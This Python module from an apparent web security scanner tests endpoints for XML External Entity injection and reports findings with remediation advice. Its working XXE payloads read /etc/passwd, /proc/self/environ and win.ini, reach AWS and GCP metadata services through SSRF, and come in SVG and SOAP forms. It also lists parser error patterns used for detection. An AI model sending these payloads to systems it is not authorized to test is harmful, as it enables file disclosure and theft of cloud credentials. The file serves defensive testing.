"""
XXE (XML External Entity) Injection Detection Module
Tests for XXE vulnerabilities in XML-accepting endpoints
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qsl, urlencode
from typing import List, Dict, Optional
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from core.paths import PAYLOADS_DIR
from utils.logger import setup_logger


@dataclass
class XXEFinding:
    """Represents a confirmed or potential XXE vulnerability"""
    url: str
    parameter: str
    payload: str
    type: str        # 'file_read', 'ssrf_via_xxe', 'blind_xxe', 'dos_xxe'
    severity: str    # 'critical', 'high', 'medium'
    confidence: str
    evidence: str
    remediation: str


class XXEScanner:
    """
    XXE Detection Module
    Detects XML External Entity injection via:
    - Direct file read (error-based + output-based)
    - Blind XXE (OOB via HTTP)
    - SSRF via XXE
    - XXE in file uploads (SVG, XML, DOCX)
    - XXE in SOAP endpoints
    """

    def __init__(self, rate_limiter: RateLimiter, payload_file: str = None):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("XXE")
        self.findings: List[XXEFinding] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(8.0, connect=5.0)

        # XXE payloads with expected output
        self.file_read_payloads = [
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                ["root:x:0:0", "daemon:x:", "bin:x:"],
                "Linux /etc/passwd read",
                "file_read",
                "critical"
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
                ["127.0.0.1", "localhost"],
                "Linux /etc/hosts read",
                "file_read",
                "critical"
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
                ["[fonts]", "[extensions]", "for 16-bit"],
                "Windows win.ini read",
                "file_read",
                "critical"
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
                ["PATH=", "HOME=", "USER="],
                "Linux /proc/self/environ read",
                "file_read",
                "critical"
            ),
        ]

        # SSRF via XXE payloads
        self.ssrf_xxe_payloads = [
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                ["ami-id", "instance-id", "security-credentials", "local-hostname"],
                "AWS metadata via XXE",
                "ssrf_via_xxe",
                "critical"
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',
                ["computeMetadata", "instance", "project"],
                "GCP metadata via XXE",
                "ssrf_via_xxe",
                "critical"
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
                ["localhost", "127.0.0.1", "html", "nginx", "apache", "IIS"],
                "SSRF to localhost via XXE",
                "ssrf_via_xxe",
                "high"
            ),
        ]

        # Error-based detection payloads (no output but error reveals XXE processing)
        self.error_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///XXETEST_NONEXISTENT_FILE">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>',
        ]

        # Error patterns that reveal XML processing / XXE
        self.error_patterns = [
            r"java\.io\.FileNotFoundException",
            r"javax\.xml",
            r"org\.xml\.sax",
            r"com\.sun\.org\.apache\.xerces",
            r"SYSTEM.*file://",
            r"XML.*parsing.*error",
            r"entity.*not.*found",
            r"Failed to load external entity",
            r"DOCTYPE.*not.*allowed",
            r"XMLSyntaxError",
            r"lxml",
            r"expat",
        ]

        # Content types that accept XML
        self.xml_content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/soap+xml",
            "application/rss+xml",
            "application/atom+xml",
        ]

        # SVG XXE payload (for file upload endpoints)
        self.svg_xxe = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
<text font-size="14" x="0" y="20">&xxe;</text>
</svg>'''

    async def _fetch(self, url: str, method: str = "POST",
                     data: Optional[str] = None,
                     content_type: str = "application/xml",
                     params: Optional[Dict] = None) -> Optional[httpx.Response]:
        """Make HTTP request with XML body"""
        try:
            headers_req = {
                'Content-Type': content_type,
                'Accept': '*/*',
            }
            async def _do_request():
                if method.upper() == "POST" and data:
                    return await self.client.post(
                        url, content=data.encode(),
                        headers=headers_req, follow_redirects=True
                    )
                return await self.client.get(url, params=params, follow_redirects=True)
            return await self.rate_limiter.execute_with_retry(_do_request)
        except Exception as e:
            self.logger.debug(f"Request failed {url}: {e}")
            return None

    def _check_indicators(self, response_text: str, indicators: List[str]) -> Optional[str]:
        """Check if any indicator is found in response"""
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return indicator
        return None

    def _check_error_based(self, response_text: str) -> Optional[str]:
        """Check for XML/XXE error messages"""
        for pattern in self.error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _is_xml_endpoint(self, response: httpx.Response) -> bool:
        """Check if endpoint accepts/returns XML"""
        content_type = response.headers.get('content-type', '').lower()
        return any(ct in content_type for ct in ['xml', 'soap', 'xhtml'])

    async def test_xml_endpoint(self, url: str) -> List[XXEFinding]:
        """Test a URL that accepts XML POST body"""
        found = []

        # Test file read payloads
        for payload, indicators, description, xxe_type, severity in self.file_read_payloads:
            for ct in ["application/xml", "text/xml"]:
                response = await self._fetch(url, method="POST", data=payload, content_type=ct)
                if not response:
                    continue

                matched = self._check_indicators(response.text, indicators)
                if matched:
                    found.append(XXEFinding(
                        url=url,
                        parameter="XML Body",
                        payload=payload,
                        type=xxe_type,
                        severity=severity,
                        confidence="high",
                        evidence=f"{description} — indicator '{matched}' found in response",
                        remediation=self._get_remediation()
                    ))
                    self.logger.warning(f"XXE [{severity.upper()}]: {url} | {description}")
                    break

                # Check error-based
                error = self._check_error_based(response.text)
                if error:
                    found.append(XXEFinding(
                        url=url,
                        parameter="XML Body",
                        payload=payload,
                        type="error_based",
                        severity="high",
                        confidence="medium",
                        evidence=f"XML/XXE processing error: '{error}'",
                        remediation=self._get_remediation()
                    ))
                    break

        # Test SSRF via XXE
        for payload, indicators, description, xxe_type, severity in self.ssrf_xxe_payloads:
            response = await self._fetch(url, method="POST", data=payload, content_type="application/xml")
            if not response:
                continue
            matched = self._check_indicators(response.text, indicators)
            if matched:
                found.append(XXEFinding(
                    url=url,
                    parameter="XML Body",
                    payload=payload,
                    type=xxe_type,
                    severity=severity,
                    confidence="high",
                    evidence=f"{description} — indicator '{matched}' found in response",
                    remediation=self._get_remediation()
                ))

        return found

    async def test_get_param(self, url: str, param: str) -> Optional[XXEFinding]:
        """Test GET parameter that might accept XML"""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        if param not in params:
            return None

        for payload, indicators, description, xxe_type, severity in self.file_read_payloads[:2]:
            test_params = params.copy()
            test_params[param] = payload
            test_url = parsed._replace(query=urlencode(test_params)).geturl()

            response = await self._fetch(test_url, method="GET")
            if not response:
                continue

            matched = self._check_indicators(response.text, indicators)
            if matched:
                return XXEFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    type=xxe_type,
                    severity=severity,
                    confidence="high",
                    evidence=f"{description} via GET param '{param}' — '{matched}' found",
                    remediation=self._get_remediation()
                )

            error = self._check_error_based(response.text)
            if error:
                return XXEFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    type="error_based",
                    severity="high",
                    confidence="medium",
                    evidence=f"XXE error in GET param '{param}': '{error}'",
                    remediation=self._get_remediation()
                )

        return None

    async def test_soap_endpoint(self, url: str) -> Optional[XXEFinding]:
        """Test SOAP endpoint for XXE"""
        soap_xxe = '''<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>'''

        response = await self._fetch(
            url, method="POST", data=soap_xxe,
            content_type="application/soap+xml"
        )
        if not response:
            return None

        matched = self._check_indicators(response.text, ["root:x:0:0", "daemon:x:"])
        if matched:
            return XXEFinding(
                url=url,
                parameter="SOAP Body",
                payload=soap_xxe,
                type="file_read",
                severity="critical",
                confidence="high",
                evidence=f"SOAP XXE — /etc/passwd content detected: '{matched}'",
                remediation=self._get_remediation()
            )

        error = self._check_error_based(response.text)
        if error:
            return XXEFinding(
                url=url,
                parameter="SOAP Body",
                payload=soap_xxe,
                type="error_based",
                severity="high",
                confidence="medium",
                evidence=f"SOAP XXE error: '{error}'",
                remediation=self._get_remediation()
            )
        return None

    def _get_remediation(self) -> str:
        return (
            "1. Disable XML external entity processing in your XML parser.\n"
            "2. Use safe XML parsing libraries with XXE disabled by default.\n"
            "3. Python: use defusedxml library instead of xml.etree.\n"
            "4. Java: set FEATURE_SECURE_PROCESSING and disable DOCTYPE declarations.\n"
            "5. PHP: use libxml_disable_entity_loader(true) before parsing.\n"
            "6. Validate and sanitize all XML input.\n"
            "7. Implement allowlist-based input validation."
        )

    async def scan(self, target_urls: List[str], forms: List) -> List[XXEFinding]:
        """
        Main XXE scan method.
        Detects XML-accepting endpoints and tests them for XXE.
        """
        self.logger.info(f"Starting XXE scan on {len(target_urls)} URLs")

        headers = {
            'User-Agent': '0xHunter Security Scanner (Authorized Testing)',
            'Accept': 'application/xml, text/xml, */*',
        }

        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client
            tasks = []

            for url in target_urls:
                parsed = urlparse(url)
                params = dict(parse_qsl(parsed.query))

                # Check if URL looks like XML/API endpoint
                url_lower = url.lower()
                if any(kw in url_lower for kw in ['xml', 'soap', 'api', 'upload', 'import', 'parse', 'feed', 'rss']):
                    tasks.append(self.test_xml_endpoint(url))
                    tasks.append(self.test_soap_endpoint(url))

                # Test GET params that might hold XML
                for param in params.keys():
                    if any(kw in param.lower() for kw in ['xml', 'data', 'input', 'body', 'content', 'payload']):
                        tasks.append(self.test_get_param(url, param))

                # Always test every URL as XML endpoint (some APIs accept XML)
                tasks.append(self.test_xml_endpoint(url))

            self.logger.info(f"Running {len(tasks)} XXE tests...")
            results = await asyncio.gather(*tasks, return_exceptions=True)

            seen = set()
            for result in results:
                if isinstance(result, Exception):
                    self.logger.debug(f"XXE test error: {result}")
                    continue
                # test_xml_endpoint returns a list
                items = result if isinstance(result, list) else ([result] if result else [])
                for finding in items:
                    if finding:
                        key = f"{finding.url}:{finding.parameter}:{finding.type}"
                        if key not in seen:
                            seen.add(key)
                            self.findings.append(finding)
                            self.logger.warning(
                                f"XXE [{finding.severity.upper()}]: {finding.url} | "
                                f"Type: {finding.type} | Confidence: {finding.confidence}"
                            )

        self.logger.info(f"XXE scan complete. Found {len(self.findings)} issues")
        return self.findings
